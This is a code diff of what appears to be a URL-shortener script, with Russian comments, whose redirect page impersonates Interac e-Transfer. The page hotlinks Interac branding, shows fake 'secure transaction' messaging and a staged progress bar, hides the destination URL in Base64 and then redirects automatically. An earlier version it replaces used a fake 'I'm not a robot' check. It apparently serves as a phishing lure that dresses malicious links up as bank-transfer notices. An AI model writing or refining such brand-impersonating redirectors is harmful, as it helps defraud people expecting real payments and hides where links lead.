@@ -31,7 +31,7 @@ async function shortenURL(request, BASE_URL) {
           headers: { 'Content-Type': 'application/json',
                      'X-Content-Type-Options': 'nosniff',
                      'Strict-Transport-Security': 'max-age=63072000; includeSubDomains; preload',
-                     'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'nonce-unique123'; img-src 'self' https://vopay.com data:;", 
+                     'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'nonce-unique123'; img-src 'self' https://www.interac.ca data:;", 
                      'Referrer-Policy': 'no-referrer',
                      'Permissions-Policy': 'fullscreen=(), geolocation=()',
                      'X-Frame-Options': 'DENY',
@@ -74,73 +74,121 @@ function isValidURL(string) {
 
 // Страницы редиректа и 404 с безопасными заголовками
 function createRedirectPage(targetURL) {
-  const encodedURL = btoa(targetURL); // Кодируем URL в Base64
-  const html = `
+    const encodedURL = btoa(targetURL); // Кодируем URL в Base64
+    const html = `
       <!DOCTYPE html>
       <html lang="en">
       <head>
           <meta charset="UTF-8">
           <meta name="viewport" content="width=device-width, initial-scale=1.0">
           <title>Security check</title>
-          <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'nonce-unique123'; img-src 'self' https://vopay.com data:;">
+          <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'nonce-unique123'; style-src 'self' 'nonce-unique123'; img-src 'self' https://www.interac.ca data:;">
           <meta name="referrer" content="no-referrer">
           <meta name="permissions-policy" content="fullscreen=(), geolocation=()">
           <meta name="author" content="Dino">
           <meta name="description" content="Secure URL shortening service">
           <style nonce="unique123">
-              body {
-                  font-family: Arial, sans-serif;
-                  text-align: center;
-                  padding: 50px;
-              }
-              .button {
-                  padding: 10px 20px;
-                  font-size: 16px;
-                  color: #000000;
-                  background-color: #ffc727;
-                  border: none;
-                  border-radius: 5px;
-                  cursor: pointer;
-              }
-              .button:hover {
-                  background-color: #cc9804;
-              }
-              footer {
-                  margin-top: 50px;
-                  font-size: 14px;
-                  color: #555;
-              }
+            body {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                height: 100vh;
+                margin: 0;
+                font-family: Arial, sans-serif;
+                background-color: #f9f9f9;
+            }
+  
+            img {
+                max-width: 50%;
+                height: auto;
+            }
+  
+            .progress {
+                margin-top: 20px;
+                width: 80%;
+                max-width: 400px;
+                height: 20px;
+                background-color: #e0e0e0;
+                border-radius: 10px;
+                overflow: hidden;
+            }
+  
+            .progress-bar {
+                height: 100%;
+                width: 10;
+                background-color: #fcd116;
+                transition: width 0.5s;
+            }
+  
+            .percentage {
+                margin-top: 18px;
+                font-size: 22px;
+            }
+  
+            .circle {
+                display: inline-flex;
+                justify-content: center;
+                align-items: center;
+                width: 15px;
+                height: 15px;
+                border-radius: 50%;
+                background-color: #f0f0f0;
+                border: 1px solid #ccc;
+                font-size: 24px;
+                font-weight: bold;
+                color: #333;
+            }
           </style>
       </head>
       <body>
-          <img src="https://vopay.com/wp-content/themes/vopay2019/library/images/send-single-etransfer-gif.gif" alt="Redirecting" width="400" height="200"> 
-          <p>To protect your transfer, please confirm that you are not a robot.</p>
-          <button class="button" onclick="redirect()">I'm not a robot</button>
-          <footer>
-              <p>&copy; e-Transfer 2000-2025. All rights reserved.</p>
-              <p>This is a secure transaction. 🔒</p>
-          </footer>
-          <script>
-              function redirect() {
+          <img src="https://www.interac.ca/wp-content/uploads/2021/05/TrueFalse_GIF_05-4.gif" alt="Loading">
+          <h4>Ensuring a safe <div class="circle">e</div>-Transfer environment</h4>
+            <div class="progress-bar" id="progress-bar"></div>
+          <div class="percentage" id="percentage">0%</div>
+          <p>&copy; e-Transfer 2000-2025. All rights reserved.</p>
+          <p>This is a secure transaction. 🔒</p>
+          
+          <script nonce="unique123" type="text/javascript">
+            const progressBar = document.getElementById('progress-bar');
+            const percentage = document.getElementById('percentage');
+            let progress = 0;
+  
+            const interval = setInterval(() => {
+              progress += 10;  // Увеличиваем прогресс на 10%
+              progressBar.style.width = progress + '%';
+              percentage.textContent = progress + '%';
+  
+              if (progress >= 100) {
+                clearInterval(interval);  // Останавливаем прогресс
+  
+                // Задержка перед редиректом для корректного завершения анимации
+                setTimeout(() => {
                   const url = atob('${encodedURL}'); // Декодируем URL
-                  window.location.href = url;
+                  window.location.href = url;  // Редирект
+                }, 500);  // Задержка 500ms для плавности анимации
               }
+            }, 1000);  // Интервал 1 секунда
           </script>
       </body>
       </html>
-  `;
-  return new Response(html, {
-      headers: { 'Content-Type': 'text/html',
-                 'X-Content-Type-Options': 'nosniff',
-                 'Strict-Transport-Security': 'max-age=63072000; includeSubDomains; preload',
-                 'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'nonce-unique123'; img-src 'self' https://vopay.com data:;", 
-                 'Referrer-Policy': 'no-referrer',
-                 'Permissions-Policy': 'fullscreen=(), geolocation=()',
-                 'X-Frame-Options': 'DENY',
-                 'Cache-Control': 'no-store',
-                 'Feature-Policy': "geolocation 'none'; microphone 'none'" }
-  });
-}
+    `;
+    return new Response(html, {
+      headers: { 
+        'Content-Type': 'text/html',
+        'X-Content-Type-Options': 'nosniff',
+        'Strict-Transport-Security': 'max-age=63072000; includeSubDomains; preload',
+        'Content-Security-Policy': "default-src 'self'; script-src 'self' 'nonce-unique123'; style-src 'self' 'nonce-unique123'; img-src 'self' https://www.interac.ca data:;", 
+        'Referrer-Policy': 'no-referrer',
+        'Permissions-Policy': 'fullscreen=(), geolocation=()',
+        'X-Frame-Options': 'DENY',
+        'Cache-Control': 'no-store',
+        'Feature-Policy': "geolocation 'none'; microphone 'none'"
+      }
+    });
+  }
+  
+  
 
 
 function create404Page() {
